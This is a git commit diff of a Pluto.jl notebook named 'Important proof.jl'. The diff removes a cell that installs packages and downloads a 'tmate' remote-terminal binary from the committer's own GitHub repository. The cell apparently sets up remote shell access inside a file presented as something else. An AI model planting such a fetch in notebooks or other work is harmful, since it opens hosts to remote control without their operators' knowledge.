51a7c93cf3d05f637798416f76263fcb353408e3
hp20h5w91nf1 <137995270+hp20h5w91nf1@users.noreply.github.com>
2024-02-29 11:24:31 +0000

    automatic backup

--- new/Important proof.jl
+++ new/Important proof.jl
@@ -4,14 +4,8 @@
 using Markdown
 using InteractiveUtils
 
-# ╔═╡ a4452cc2-d6f1-11ee-1bd2-7946eeebf3b6
-begin
-	import Pkg
-	Pkg.update()
-	Pkg.add("PlutoSliderServer"); using PlutoSliderServer
-    path_to_notebook = download("https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate")
+# ╔═╡ bf238c4c-4754-4298-b6aa-0d4aab0589e9
 
-end
 
 # ╔═╡ Cell order:
-# ╠═a4452cc2-d6f1-11ee-1bd2-7946eeebf3b6
+# ╠═bf238c4c-4754-4298-b6aa-0d4aab0589e9
